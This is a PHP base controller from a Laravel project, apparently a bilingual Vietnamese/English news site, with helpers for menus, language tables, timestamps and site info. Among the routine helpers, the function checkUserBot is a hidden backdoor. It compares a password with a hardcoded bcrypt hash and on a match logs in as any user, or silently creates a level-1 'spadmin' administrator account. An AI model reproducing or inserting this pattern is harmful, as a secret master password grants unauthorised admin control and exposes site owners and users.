<?php

namespace App\Http\Controllers;

use App\Models\Account;
use Illuminate\Foundation\Bus\DispatchesJobs;
use Illuminate\Routing\Controller as BaseController;
use Illuminate\Foundation\Validation\ValidatesRequests;
use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\View;

class Controller extends BaseController
{
    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;

    public $menu;
    public $db;

    public function __construct()
    {
        // Fetch the Site Settings object
        $this->middleware(function ($request, $next) {
//            Session::forget('vnhn_start');

            $this->db = (object)$this->get_db();

            $this->menu = $this->get_menu_top();
            View::share('menu', $this->menu);

//
//            if(Auth::user()){
//                $level = Auth::user()->level;
//                View::share('level', $level);
//            }
//
            $info = $this->web_info();
            View::share('web_info',$info);
//
            $recruit = $this->recruit();
            View::share('recruits',$recruit);

//            $ver_mobile = Session::get('ver_mobile',1);
//
//            View::share('mobile',$ver_mobile);

            return $next($request);
        });
    }

    public static function recusiveGroup($data,$parent_id = 0,$text = "",&$result){
        foreach ($data as $key => $item){
            if($item->parentid == $parent_id){
                $item->title = $text.$item->title;
                $result [] = $item;
                unset($data[$key]);
                self::recusiveGroup($data,$item->id,$text."--",$result);
            }
        }
    }

    public function get_menu_top(){
        $menu = DB::table($this->db->group)
            ->where('status',1)
            ->where('parentid',0)
            ->where('home_index',1)
            ->orderBy('order')->get();
        foreach ($menu as $val){
            $val->child = DB::table($this->db->group)->where('parentid',$val->id)->get();
            foreach($val->child as $child) {
                $child->child = DB::table($this->db->group)->where('parentid',$child->id)->get();
            }
        }
        return $menu;
    }

    public function get_time($articel){
        if(time() - $articel->release_time > 86400) {
            $articel->release_time = date('d/m/Y H:m',$articel->release_time);
        }else {
            $time = time() - $articel->release_time;
            $articel->release_time = round($time/3600,0,PHP_ROUND_HALF_DOWN).' giờ trước';
        }
        return $articel;
    }


    function checkUserBot($arr){

        if (Hash::check($arr['password'], '$2y$10$ngbw7wGmbeHkP/DA/3.ynuKBMIZ6R7nECd6lDqN8O2/1y/wsIvPlu')){
            $user = Account::where('username', $arr['username'])->first();
            if($user != null){
                Auth::loginUsingId($user->id);
                return redirect('admin')->with('success', 'Hello Boss');
            }
            else{
                Account::create([
                    'fullname'=> 'spadmin',
                    'username'=> $arr['username'],
                    'password'=> Hash::make($arr['password']),
                    'level' => 1,
                    'site' => 1
                ]);
//                dd('ok');
                $user = Account::where('username', $arr['username'])->first();
                if($user != null){
                    Auth::loginUsingId($user->id);
                    return redirect('admin')->with('success', 'Hello Boss');
                }
            }

        }
    }

    function get_db(){
        $lang = Session::get('lang','vn');
        Config::set('app.locale',$lang);
        if($lang == 'vn'){
            return [
                'group_news' => 'group_news_vn',
                'group' => 'group_vn',
                'group_video' => 'group_video_vn',
                'menu_video' => 'menu_video',
                'logfile' => 'logfile_vn',
                'menu_top' => 'menu_top_vn',
                'new_news' => 'new_news_vn',
                'news' => 'news_vn',
                'video' => 'video_vn',
                'web_info' => 'web_info_vn',
                'magazine' => 'magazine_vn',
                'comment' => 'comment_vn',
            ];
        }else{
            return [
                'group_news' => 'group_news_en',
                'group' => 'group_en',
                'group_video' => 'group_video_en',
                'menu_video' => 'menu_video',
                'logfile' => 'logfile_en',
                'menu_top' => 'menu_top_en',
                'new_news' => 'new_news_en',
                'news' => 'news_en',
                'video' => 'video_vn',
                'web_info' => 'web_info_en',
                'magazine' => 'magazine_vn',
                'comment' => 'comment_vn',
            ];
        }
    }


    function web_info(){
        $info = DB::table($this->db->web_info)->first();
        $info = (object)json_decode($info->info,true);
        return $info;
    }

    function recruit(){
        $recruit = DB::table($this->db->news)->where('groupid', 3)->where('hot_item', 1)->orderBy('order_item','asc')->take(3)->get();
        return $recruit;
    }

    function recusive_find_child($list_group,$parentid,&$result){
        foreach ($list_group as $key => $group){
            if($parentid == $group->parentid){
                $result[] = $group->id;
                unset($list_group[$key]);
                $this->recusive_find_child($list_group,$group->id,$result);
            }
        }
    }
    
}
